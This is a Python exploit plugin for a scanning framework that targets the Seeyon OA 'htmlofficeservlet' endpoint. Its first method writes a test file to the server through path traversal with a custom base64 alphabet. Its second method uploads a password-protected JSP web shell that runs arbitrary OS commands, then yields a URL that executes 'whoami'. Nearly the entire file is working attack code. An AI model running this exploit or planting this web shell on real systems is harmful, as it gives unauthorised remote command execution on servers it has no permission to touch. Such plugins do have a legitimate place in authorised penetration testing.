#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import asyncio
import random
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from lib.util.cipherutil import base64encode
from script import BaseScript

class Script(BaseScript):
    """
    seeyon getshell
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            table = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
            test_file = 'test' + str(random.randint(100000, 999999)) + '.txt'
            base64_file = str(base64encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\{}'.format(test_file), table))
            url = self.base_url + 'seeyon/htmlofficeservlet'
            async with ClientSession() as session:
                async with session.get(url=url) as res:
                    if res:
                        text = await res.text()
                        if 'DBSTEP V3.0' in text:
                            data = '''DBSTEP V3.0     355             0               22             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME={}\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66 \r\nthis is a test for me.f82abdd62cce9d2841a6efd5663e7bee'''.format(base64_file)
                            async with session.post(url=url, data = data) as res2:
                                # print(self.base_url +  'seeyon/' + test_file)
                                await asyncio.sleep(1)
                            url1 = self.base_url + 'seeyon/' + test_file
                            async with session.get(url=url1) as res:
                                if res != None:
                                    text2 = await res.text()
                                    if 'this is a test for me' in text2:
                                        yield url1


    async def upload(self):
        if self.base_url:
            table = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
            test_file = 'test' + str(random.randint(100000,999999)) + '.jsp'
            base64_file = str(base64encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\{}'.format(test_file),table))
            url = self.base_url + 'seeyon/htmlofficeservlet'
            async with ClientSession() as session:
                async with session.get(url=url) as response:
                    if response!=None:
                        text = await response.text()
                        if 'DBSTEP V3.0' in text:
                            data = '''DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME='''+ base64_file + '''\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("test12345".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>c0a4500844f330626a5f11e1563b03f2'''
                            async with session.post(url=url, data = data) as response:
                                await asyncio.sleep(1)
                            url1 = self.base_url + 'seeyon/' + test_file
                            async with session.get(url=url1) as response1:
                                if response1 != None:
                                    text1 = await response1.text()
                                    if ':-)' in text1:
                                        yield url1 +'?pwd=test12345&cmd=whoami'